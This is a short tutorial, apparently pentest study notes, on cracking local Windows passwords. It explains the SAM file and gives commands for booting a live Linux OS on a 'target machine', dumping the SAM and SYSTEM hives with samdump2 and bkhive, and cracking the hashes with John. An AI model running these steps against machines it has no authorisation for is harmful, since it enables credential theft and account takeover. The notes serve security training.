# Windows - Local Password Cracking

## Theory

Before we can crack passwords on a local machine, we first have to locate the password hash file.

In windows based systems, the hashes are stored in a special file called the Security Account Manager (SAM) file. On NT based windows systems including windows 2000 and above, the SAM file is located in the **`C:\Windows\System32\Config\`** directory.

Microsoft has added some additional security features to help protect the SAM file:

* The SAM file is actually locked when the OS boots up. This means that while the OS is running we do not have the ability to open or copy the SAM file. In addition to the lock, the entire SAM file is encrypted and not viewable.



***

## Practical

### Bypass Windows Restrictions

Because we have physical access to the system, the simplest way to bypass the windows proctections is to boot to an alternate OS like Kali and Parrot.

#### Mount the Local Hard Drive

```
# List availabe drives
fdisk -l

# Create a mount point
mkdir /mnt/sda1

# Mount the drive which contains windows folder
mount dev/sda1 mnt/sda1
```

#### Browse the C: drive

```
# Navigate to the SAM file
cd /mnt/sda1/Windows/system32/config
```

#### Extract Hashes

Dump hashes using samdump2

```
samdump2 system SAM > /tmp/hashes.txt
```

Extract key from the system file using bkhive

```
bkhive system sys_key.txt

# Extract hashes
samdump2 SAM sys_key.txt > /tmp/hash.txt
```

#### Crack Hashes using John

```
john /tmp/hashes.txt --format=nt

john /tmp/hashes.txt
```



***

## Steps to Perfrom on a Local Machine

* Shut down the target machine
* Boot the target to Kali or Parrot OS via a live CD or USB drive.
* Mount the local hard drive
* Use Samdump2 and extract the hashes
* Use John to crack the passwords.



***

## REFERENCES

* [https://www.nitttrchd.ac.in/imee/Labmanuals/Password%20Cracking%20of%20Windows%20Operating%20System.pdf](https://www.nitttrchd.ac.in/imee/Labmanuals/Password%20Cracking%20of%20Windows%20Operating%20System.pdf)
* [https://www.hackingarticles.in/multi-ways-to-crack-windows-10-password/](https://www.hackingarticles.in/multi-ways-to-crack-windows-10-password/)
* [https://traviswhitney.com/2016/12/30/using-samdump2/](https://traviswhitney.com/2016/12/30/using-samdump2/)

